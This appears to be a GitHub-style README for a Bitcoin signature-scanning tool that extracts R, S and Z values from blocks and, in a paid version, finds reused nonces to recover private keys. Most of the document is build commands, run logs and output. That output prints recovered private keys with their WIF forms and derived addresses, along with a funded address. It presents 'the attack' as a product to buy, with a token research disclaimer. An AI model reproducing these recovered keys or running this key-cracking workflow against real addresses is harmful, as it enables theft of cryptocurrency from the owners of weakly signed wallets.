# Blockchain transaction signature RSZ extraction script

The script connects to a Bitcoin or compatible blockchain node via RPC, scans a specified range of blocks, and extracts the R, S, and Z values of the ECDSA signature from the transaction input script ("scriptSig"). The extracted information is then saved to the specified output file.

## Features

*   Connects to a blockchain node via JSON-RPC.
*   Fetches block data for a specified block height range.
*   Iterates through each transaction in a block (skipping Coinbase transactions).
*   Parses and extracts ECDSA signature R and S values from the `scriptSig` of transaction inputs (`vin`).
*   Writes the transaction ID containing signatures, along with the corresponding R and S values, to the specified output file.
*   Includes an RPC connection retry mechanism and a prompt for manual reconnection ('P' key).
*   Displays a progress bar during processing.

## Requirements

*   Python 3
*   `requests` library (installable via `pip install requests base58`)
*   A running Bitcoin Core or compatible node with RPC service enabled.

## Setup

Before running the script, you **must** modify the following RPC connection settings at the beginning of the script to match your node's configuration:

```python
# RPC Connection Settings
RPC_USER = 'Your_RPC_Username'
RPC_PASSWORD = 'Your_RPC_Password'
RPC_PORT = 'Your_RPC_Port' # Default is usually 8332 (mainnet) or 18332 (testnet)
RPC_URL = f'http://127.0.0.1:{RPC_PORT}' # Modify the IP address if the node is not on localhost
```
# Usage

Run the script from the command line, providing three required arguments: start block height, end block height, and the output filename.
```
python3 extract_data.py <start_block> <end_block> <output_file>
```



Parameters:

<start_block>: The block height to start scanning from (integer).

<end_block>: The block height to end scanning at (integer, inclusive).

<output_file>: The path and name of the file to save the extracted results.

# Example:
```
python3 extract_data.py 700000 700010 signatures_output.txt
```


This command will scan blocks from 700000 to 700010 (inclusive) and save the extracted transaction IDs and signature R/S values to the signatures_output.txt file.

# Output Format

The output file will contain content in the following format:
```
Transaction ID: <Transaction Hash>
  Signature - R: <Signature R value (hex)>, S: <Signature S value (hex)>
Transaction ID: <Another Transaction Hash>
  Signature - R: <Signature R value (hex)>, S: <Signature S value (hex)>
  Signature - R: <Another Signature R value from the same transaction (hex)>, S: <Another Signature S value from the same transaction (hex)>
```


# Notes

The script assumes the RPC node is running at http://127.0.0.1. If your node is on a different host or uses a different protocol (e.g., HTTPS), be sure to modify the RPC_URL.

The signature extraction method relies on regular expression matching and basic parsing of the scriptSig.asm format. It might not cover all complex or non-standard script types.

If the RPC connection fails, the script will attempt to reconnect several times. If failures persist, it will prompt the user to press 'P' to manually trigger a reconnection attempt.

# Get Bitcoin R, S, Z values from transaction hash

Getting RSZ values you can recover Bitcoin private key using weak signatures with random vulnerability.
```
https://allprivatekeys.com/get-rsz-signature-from-tx
```
# Or use script extract_rszp.py

View raw transaction data https://btc.exan.tech/tx/b5add54960756c58ebabb332c5ef89098d2c3b8f2107b939ec542178e846108b
```
python3 extract_rszp.py -d b5add54960756c58ebabb332c5ef89098d2c3b8f2107b939ec542178e846108b
Fetching raw transaction for txid: b5add54960756c58ebabb332c5ef89098d2c3b8f2107b939ec542178e846108b...
Successfully fetched raw transaction.

Analyzing Transaction...
======================================================================
[Input Index #: 0]
     R: 83fe1c06236449b69a7bee5be422c067d02c4ce3f4fa3756bd92c632f971de06
     S: 7405249d2aa9184b688f5307006fddc3bd4a7eb89294e3be3438636384d64ce7
     Z: 070239c013e8f40c8c2a0e608ae15a6b1bb4b8fbcab3cff151a6e4e8e05e10b7
PubKey: 04ca5606a1e820e7a2f6bb3ab090e8ade7b04a7e0b5909a68dda2744ae3b8ecbfa280a47639c811134d648e8ee8096c33b41611be509ebca837fbda10baaa1eb15
======================================================================

Analysis complete.

python3 extract_rszp.py -x 01000000013bf51de6fb77fb5aacd88b39d94af438145aa7c2d728979d3ee33651ed09c5fd000000008b48304502210083fe1c06236449b69a7bee5be422c067d02c4ce3f4fa3756bd92c632f971de0602207405249d2aa9184b688f5307006fddc3bd4a7eb89294e3be3438636384d64ce7014104ca5606a1e820e7a2f6bb3ab090e8ade7b04a7e0b5909a68dda2744ae3b8ecbfa280a47639c811134d648e8ee8096c33b41611be509ebca837fbda10baaa1eb15ffffffff01905f010000000000232103bec42e5d718b0e5b3853243c9bcf00dd671a335b0eb99fd8ca32f8d5784a9476ac00000000

Analyzing Transaction...
======================================================================
[Input Index #: 0]
     R: 83fe1c06236449b69a7bee5be422c067d02c4ce3f4fa3756bd92c632f971de06
     S: 7405249d2aa9184b688f5307006fddc3bd4a7eb89294e3be3438636384d64ce7
     Z: 070239c013e8f40c8c2a0e608ae15a6b1bb4b8fbcab3cff151a6e4e8e05e10b7
PubKey: 04ca5606a1e820e7a2f6bb3ab090e8ade7b04a7e0b5909a68dda2744ae3b8ecbfa280a47639c811134d648e8ee8096c33b41611be509ebca837fbda10baaa1eb15
======================================================================

Analysis complete.

```
********************************************************************************************************************************************************


The above is the v1.0 free manual filling version. The following introduces the v2.0 paid version that purchased the compressed package password. It is a one-time fee that unlocks all paid items. It is written in C++ and uses nodes to directly extract RSZ values, save them to the document, and then run the matching program script. It supports batch query of repeated R, automatically fills in information and outputs the final private key.

# Build Dependencies

Linux (Debian/Ubuntu)：

1. Update the package list
```
sudo apt-get update
```
2. Install the C++ compiler and build tools (if not already installed)
```
sudo apt-get install build-essential
```
3. Install the development files for OpenSSL and libcurl
```
sudo apt-get install libssl-dev libcurl4-openssl-dev
```
# Compilation
```
g++ -std=c++17 extract_rsz.cpp -lcurl -lpthread -lssl -lcrypto -Wall -Wextra -O3 -march=native -o extract_rsz
g++ -std=c++17 -pthread -O3 -o crack_keys crack_keys.cpp -lssl -lcrypto -Wall -Wextra
g++ extract_rszp.cpp -static -o extract_rszp -I/home/vcpkg/installed/x64-linux/include -L/home/vcpkg/installed/x64-linux/lib -lcpr -lcurl -lssl -lcrypto -lpthread -lz -std=c++17 -Wall -Wextra
```
# Use and testing

As above, you need to configure the node information rpc_config.json .
```
  "rpc_host": "127.0.0.1",
  "rpc_port": 8332,
  "rpc_user": "8891689",
  "rpc_password": "1111111111111111111111$ddbbda8cbc8c0a8cc32a84d0590f2de17f1f8dc798c4411111111111111111111",
  "num_workers": 4
}
```
BTC core wallet bitcoin.conf file configuration in the .bitcoin file directory If you don’t understand, ask AI.
```
txindex=1
listen=1
server=1
daemon=1
debug=1
logips=1
printtoconsole=1
logtimestamps=1
fallbackfee=0.0002
maxconnections=500
rpcuser=8891689
rpcpassword=1111111111111111111111$ddbbda8cbc8c0a8cc32a84d0590f2de17f1f8dc798c4411111111111111111111
rpcbind=127.0.0.1
rpcallowip=127.0.0.1
rpcport=8332
dbcache=8000
par=4
datadir=/media/.bitcoin
debuglogfile=/media/.bitcoin/debug.log
```
# Instances extracted from 750001 800000
```
./extract_rsz -h
Usage: ./extract_rsz <start_block> <end_block> <output_file>


./extract_rsz 750001 800000 750001.800000.txt
Progress: 50000/50000 blocks. Total Signatures: 63466929. Rate (overall): 7.54 blk/s, 9566.82 sig/s.
--- Processing Complete ---
Processed block range: 750001 - 800000
Total signatures extracted: 63466929
Total time: 6634.12 seconds
```
# 750001.800000.txt The output document content is as follows:
```
ID: bdb4c770d447739e9a53ac862343a753f50f9e7bf07721b8820eb949964f5c8e
R : 5362a267cdcd89391979d6b9e279fe9c8b1caf4b76d432cd2600e8dc21f30d4b
S : 2fa68702df640a3f73c01572736665bee77de0705e5a55a3d2cea9a005da3188
Z : d3b06b8130896df3086783776cec118c114692d810986eabe822dc7235e2deac
.
.
.
.
ID: 446e4a76261e495b82e5c4085f30ee1fa027f4d3c0ccb4afc10c0c6d0614ede7
R : 3a183536ab42a3777d310fdb1e18bac17234e9bb181ebbab78efc9a9f69dad35
S : 0a1f5e1aa0a608dcee31c68c48984ba88fc035d83775765a09ef7cd5538afaf0
Z : 70e446fc3b2a405dc000340787b2f7f95b638adbc11f25199b749848e7c3f2da
ID: 76ed258ef48cd9ef643f84b22172536b7e204431f92a1e5ed90ac1cb7c0f46b9
R : e3fac5013cb64da897797a9aea58e8eeb5f49388f3c30a7a2c9dc16144722d79
S : 48f35443bf7153b211426355ac2aa528c44f3dcaa21bac87c39d059090eeae99
Z : dfe7ed29489932a243e1812511eb143be5d7622c775cdffe41de202b472431fe
```
# crack_keys The obtained data is then run the batch search duplicate R script program.

Run in the data directory, the program script will read. 
```
./crack_keys

./crack_keys
Scanning directory: /home/test
Found 1 files. Starting 8 worker threads...

All threads finished.

Success! Private keys have been found.
  - Detailed logs written to: found_keys.txt
  - Private keys only written to: private_keys_only.txt
    
```
found_keys.txt The output is as follows.
```
====== Private Key Found! ======
Private Key: f1f2f43b4a197650e05eada740d6b0a7bb01628d29052a40a1428d425c06437d
------
[Source 1]
ID: 19d66411a5aa716a04b37197c11c93c9446a54694a2d2302093d8b0a93ed5d83
R : cabc3692f1f7ba75a8572dc5d270b35bcc00650534f6e5ecd6338e55355454d5
S : 0437b68b1ea23546f6f712fd6a7e5370cfc2e658a8f0245628afd8b6999d9da6
Z : 109a80161c75f67ff6b98166b061e82e4b739ee8cac2820f173ab8b1f9991242
------
[Source 2]
ID: c6b32e0c2c3798f8c72ee21e41846d3d872586a96d8a1e277d7666c6666dfb4c
R : cabc3692f1f7ba75a8572dc5d270b35bcc00650534f6e5ecd6338e55355454d5
S : 09ddb766ace47385fb2a7846b09357df890e339248a6e436242f703f530e54d1
Z : fc9d8609145a57371932f482c20c134bd7fd3478b66ad430be46c2942101e2ba

.
.
.
====== Private Key Found! ======
Private Key: c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
------
[Source 1]
ID: 2229e4d6a7216690050341c35b5641f18ceb881033c332796ea12e1924c377af
R : d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
S : 90d1b50635e4eaca683c32266205f5b0429c9a7669659c4e5eba032658d6394c
Z : 01ec1a3f62f35a3f0489f03983ce4ad8e7d89bdb3194baeb68d1a29cae4a6203
------
[Source 2]
ID: 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
R : d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
S : e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
Z : fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
```
private_keys_only.txt The output is as follows.
```
f1f2f43b4a197650e05eada740d6b0a7bb01628d29052a40a1428d425c06437d
.
.
.

c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
```
Analyzing these data, we can find that as long as the program script is not fully tested, it is possible to reuse the R value, which will lead to the private key being attacked and leaked. When using a wallet in daily life, you must fully understand the credibility of the wallet and choose a wallet that has been verified for security.

# Let’s verify the data below
```
https://btc.exan.tech/tx/2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
```
```
./extract_rszp -h
Usage: ./extract_rszp <option> <value>
Options:
  -d <txid>    txid of the transaction. Automatically fetch rawtx.
  -x <rawtx>   Raw Transaction on the blockchain.

 ./extract_rszp -d 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
Fetching rawtx for txid: 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8 ...

Starting Program...
======================================================================
[Input Index #: 0]
     R: d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
     S: e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
     Z: fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff

./extract_rszp -x 0100000001445c9b1db04a8fd1f5626a2ada5033e5fd57bfd05eb0ddb499bfdc7f0d39925b010000008a4730440220d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad10220e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea014104dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ffffffffff01f0490200000000001976a914019453ca35e7cdc43118dda7bc81ee981bd6f92488ac00000000

Starting Program...
======================================================================
[Input Index #: 0]
     R: d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
     S: e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
     Z: fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
```

The attack recovered the private key and after checking, it was found that there had been a large number of transactions.
```
./skey c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
Input Private Key (Hex): c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
Private Key (Hex, 32 bytes): c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
WIF (Uncompressed): 5KJp7KEffR7HHFWSFYjiCUAntRSTY69LAQEX1AUzaSBHHFdKEpQ
WIF (Compressed):   L3ocvsVKeZQirj2vTD5WqcvDXxsN8DhmaVYfRirZ8a8NrXpbcF4R

Public Key (Compressed,   33 bytes): 03dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81
Public Key (Uncompressed, 65 bytes): 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff

=== Addresses Generated from Compressed Public Key ===
P2PKH:        1CkGXcY4eYCJ5QjcxF7WmhXG3dhzbAg2Kk
P2SH-P2WPKH:  38eG2mvgVFCvCWYmvee5vDaYGuUbNHByvK
BECH32:       bc1qsrvrkcpazsrsd5x99z27llk3sa0szf8v8p8xft
P2WSH-P2WPKH: bc1q8dxfswvvzjg52efdsfwxqq70xga85flmpncfez2ewg65qrc9vw9qtrvvmp

=== Addresses Generated from Uncompressed Public Key ===
P2PKH:        1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm
P2SH-P2WPKH:  3CkyhPfgDiifVpZM6YMyTfFoiD4deoCNa2 (Note: Non-standard)
BECH32:       bc1qwpujld62thm5twkq0hm0uqs0suwtk2fm7ec7jv (Note: Non-standard)
P2WSH-P2WPKH: bc1qs2swmd4jwajffz0sdfxvgpjjzmsekcvajjq8g0w8mmfrhjp3k7qq3jjt4r (Note: Non-standard)

```
Bitcoin Address:
```
1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm   0.1638814 184
```
These leaked private keys may be BTC lost due to attacks.


# Sponsorship
If this project was helpful to you, please buy me a coffee. Your support is greatly appreciated. Thank you!
```
BTC: bc1qt3nh2e6gjsfkfacnkglt5uqghzvlrr6jahyj2k
ETH: 0xD6503e5994bF46052338a9286Bc43bC1c3811Fa1
DOGE: DTszb9cPALbG9ESNJMFJt4ECqWGRCgucky
TRX: TAHUmjyzg7B3Nndv264zWYUhQ9HUmX4Xu4
```

# 📜 Disclaimer
Reminder: Do not enter the real private key on the connected device!

This tool is only used for learning, analysis, vulnerability repair, software testing BUG and other research. Please use it with understanding of the relevant risks. Cracking other people's private keys is unethical and will be subject to legal sanctions. Please abide by local laws and regulations. The developer does not assume any responsibility for economic losses or legal liabilities caused by the use of this tool.

